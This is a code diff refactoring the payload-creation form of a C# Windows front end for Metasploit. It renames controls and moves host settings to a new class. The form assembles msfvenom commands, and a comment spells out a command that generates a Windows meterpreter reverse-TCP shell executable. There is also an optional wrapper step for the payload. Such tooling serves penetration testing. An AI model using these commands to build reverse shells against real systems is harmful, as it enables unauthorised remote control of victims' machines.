@@ -25,13 +25,17 @@ namespace Metasploit_GUI
         private void CreatePayload_Load(object sender, EventArgs e)
         {
             UpdateHost();
-            grayoutnotinstalled();
+
+            if (!Statics.pythonwrapper_installed)
+            {
+                groupBox5.Enabled = false;
+            }
         }
 
         public void UpdateHost()
         {
-            textBox1.Text = Options.lhost;
-            textBox2.Text = Options.lport.ToString();
+            textBoxLhost.Text = Statics.lhost;
+            textBoxLport.Text = Statics.lport;
         }
 
         static public void UpdateHostFromSpace()
@@ -43,43 +47,45 @@ namespace Metasploit_GUI
 
         private void button1_Click(object sender, EventArgs e)
         {
-            new Options().Show();
+            //new Options().Show();
+            new Profiles().Show();
             UpdateHost();
         }
 
+        /*
         private void groupBox1_Enter(object sender, EventArgs e)
         {
 
-        }
+        }*/
 
         private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
         {
-            Payload = comboBox1.SelectedItem.ToString();
-            Console.WriteLine(comboBox1.SelectedIndex);
-            int index = comboBox1.SelectedIndex;
+            Payload = comboBoxTargetType.SelectedItem.ToString();
+            Console.WriteLine(comboBoxTargetType.SelectedIndex);
+            int index = comboBoxTargetType.SelectedIndex;
             if(index == 0 || index == 1)
             {
-                label3.Text = "Windows";
+                labelTargetfiletype.Text = "Windows";
                 filetype = "exe";
             }
             if(index == 2)
             {
-                label3.Text = "Webserver: Windows, Linux";
+                labelTargetfiletype.Text = "Webserver: Windows, Linux";
                 filetype = "raw";
             }
             if(index == 3)
             {
-                label3.Text = "OS X";
+                labelTargetfiletype.Text = "OS X";
                 filetype = "macho";
             }
             if(index == 4)
             {
-                label3.Text = "OS X, Linux";
+                labelTargetfiletype.Text = "OS X, Linux";
                 filetype = "elf";
             }
             if(index == 5)
             {
-                label3.Text = "Windows";
+                labelTargetfiletype.Text = "Windows";
                 filetype = "raw";
             }
         }
@@ -88,21 +94,22 @@ namespace Metasploit_GUI
         {
             //msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
             string strCmdText;
-            if (comboBox2.SelectedItem == "none")
+            if (comboBoxEncoders.SelectedItem.ToString() == "none")
             {
-                strCmdText = "/C msfvenom -p " + comboBox1.SelectedItem + " LHOST=" + Options.lhost + " LPORT=" + Options.lport + " -f " + filetype + " -o " + saveLocation.Text + " & pause";
+                strCmdText = "/C msfvenom -p " + comboBoxTargetType.SelectedItem + " LHOST=" + Statics.lhost + " LPORT=" + Statics.lport + " -f " + filetype + " -o " + saveLocation.Text + " & pause";
             }
             else
             {
-                strCmdText = "/C msfvenom -p " + comboBox1.SelectedItem + " -e " + comboBox2.SelectedItem + " LHOST=" + Options.lhost + " LPORT=" + Options.lport + " -f " + filetype + " -o " + saveLocation.Text + " & pause";
+                strCmdText = "/C msfvenom -p " + comboBoxTargetType.SelectedItem + " -e " + comboBoxEncoders.SelectedItem + " LHOST=" + Statics.lhost + " LPORT=" + Statics.lport + " -f " + filetype + " -o " + saveLocation.Text + " & pause";
                 //strCmdText = "/C msfvenom -p " + comboBox1.SelectedItem + " -e "+ comboBox2.SelectedItem + " && pause";
             }
             //strCmdText = "/C msfvenom -p "+comboBox1.SelectedItem;
             Console.WriteLine(strCmdText);
             //System.Diagnostics.Process.Start("CMD.exe", strCmdText);
-            if (checkBox1.Checked)
+            if (checkBoxPythonWrapper.Checked)
             {
-                strCmdText = strCmdText + " " + systemroot + @"metagui\Extensions\Python-Enwrapper\Enwrapper.exe" + '"' + saveLocation.Text + '"';
+                //strCmdText = strCmdText + " " + systemroot + @"metagui\Extensions\Python-Enwrapper\Enwrapper.exe" + '"' + saveLocation.Text + '"';
+                strCmdText = $"{strCmdText} {systemroot}";
                 /*
                 string strCmdText1;
                 strCmdText1 = '"' + saveLocation.Text + '"';
@@ -114,7 +121,7 @@ namespace Metasploit_GUI
 
         private void button3_Click(object sender, EventArgs e)
         {
-            int index = comboBox1.SelectedIndex;
+            int index = comboBoxTargetType.SelectedIndex;
             if (index == 0 || index == 1)
             {
                 saveFileDialog1.DefaultExt = "exe";
@@ -151,20 +158,7 @@ namespace Metasploit_GUI
 
         private void button5_Click(object sender, EventArgs e)
         {
-            new ConsoleWindow("handler").Show();
-        }
-        public void grayoutnotinstalled()
-        {
-            if (!Options.pythonwrapper)
-            {
-                groupBox5.Enabled = false;
-            }
-            
-        }
-
-        private void checkBox1_CheckedChanged(object sender, EventArgs e)
-        {
-
+            new ConsoleWindow(ConsoleStartOptions.handler).Show();
         }
     }
 }
